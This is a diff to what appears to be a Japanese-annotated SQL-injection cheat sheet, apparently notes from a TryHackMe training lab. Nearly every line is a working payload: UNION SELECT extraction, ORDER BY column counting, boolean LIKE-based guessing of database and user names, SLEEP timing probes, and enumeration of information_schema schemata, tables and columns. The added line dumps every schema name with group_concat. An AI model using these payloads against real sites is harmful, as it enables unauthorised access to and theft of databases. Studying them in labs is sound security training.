@@ -30,6 +30,7 @@ https://website.thm/checkuser?username=admin' order by 4;-- - #order byもでき
 union select null, null, database();-- -
 union null, null, null where database() like '%';-- - #ブールベースの認証だったとき%をワイルドカードでつかう'm%'など真応答が返ってくる文字を一文字ずつ試す
 UNION SELECT 1,2,3 from users where username like 'a% #ブールベースのユーザ名の特定
+'union select group_concat(SCHEMA_NAME) from information_schema.schemata;-- - #schemataからの抽出
 
 //sleepの利用
 UNION SELECT SLEEP(5);-- -  #応答に５秒の停止がなければクエリが失敗している
@@ -45,7 +46,7 @@ curl <url> -d "<sql>;-- -" #コマンドラインからcurlでもできる
 UNION SELECT column_name, table_name, null from information_schema.columns;-- -
 
 //テーブル情報の列挙
-UNION SELECT null,null,table_name FROM information_schema.tables;-- - #mysqlの場合
+'union select null,null,table_name FROM information_schema.tables;-- - #mysqlの場合
 
 //カラム情報の列挙
 union select null, null, column_name from information_schema.columns;-- -　#mysqlの場合
